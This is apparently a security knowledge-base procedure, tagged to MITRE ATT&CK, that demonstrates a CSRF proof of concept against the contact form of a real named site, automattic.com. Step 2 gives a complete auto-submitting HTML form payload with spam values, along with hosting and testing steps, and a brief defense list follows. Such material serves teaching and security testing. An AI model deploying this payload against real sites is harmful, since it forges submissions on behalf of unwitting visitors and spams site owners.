---
tags:
  - csrf
  - poc
  - exploitation
  - web
type: procedure
tools:
  - '[[tools/Burp-Suite-Professional]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:22.883Z'
skill_level: beginner
impact_level: low
detection_risk: medium
sub_techniques: []
id: 8df273e7-bdf9-413a-99c6-80ea7960f923
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Demonstrate CSRF Proof of Concept

## Summary

This procedure creates a malicious HTML page to exploit CSRF by auto-submitting a forged form on behalf of a victim, demonstrating unauthorized contact form submission.

## Description

Targeting http://automattic.com/contact/, the PoC uses hidden form fields (e.g., your_name='saddsa', your_email='sdasad@sg.com', blog_url='', subject='Test', message='CSRF PoC') and JavaScript to auto-submit via POST. When a user visits the malicious page (e.g., via phishing), it forces the action if they are authenticated elsewhere. Limited impact as form is anonymous, but shows spam potential. Requires proxy tool for generation and a test browser.

## Requirements

1. Proxy tool like Burp Suite for request capture
2. Local web server to host PoC HTML
3. Victim simulation in browser

## Defense

Defensive measures and detection strategies:

- Add unique CSRF tokens validated on server
- Implement referrer checks or origin validation
- Educate users on phishing and suspicious links

## Objectives

1. Forge and submit contact form data without user consent
2. Validate exploitation in a controlled environment
3. Assess impact of unwanted submissions

## Instructions

### Step 1: Capture Legitimate Request

**Context**: Use proxy to record a normal form submission for replication.

Intercept with [[tools/Burp-Suite-Professional]] a POST to /contact/.

No command; configure Burp proxy and submit form via browser.

> Note exact parameters: your_name, your_email, etc.

### Step 2: Generate Malicious HTML PoC

**Context**: Create HTML with hidden form and auto-submit script.

Use Burp's CSRF PoC generator or manually craft:

<html><body><form action="http://automattic.com/contact/" method="post"><input type="hidden" name="your_name" value="saddsa"/><input type="hidden" name="your_email" value="sdasad@sg.com"/><input type="hidden" name="subject" value="Spam"/><input type="hidden" name="message" value="Unwanted"/><input type="submit" value="Submit"/></form><script>document.forms[0].submit();</script></body></html>

> Save as poc.html and host locally (e.g., python -m http.server).

### Step 3: Test Exploitation

**Context**: Simulate victim by visiting PoC while on target site.

Open poc.html in browser after visiting automattic.com.

> Expected: Automatic POST submission; check network tab for success.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite-Professional]]

## Tags

- [[csrf]]
- [[poc]]
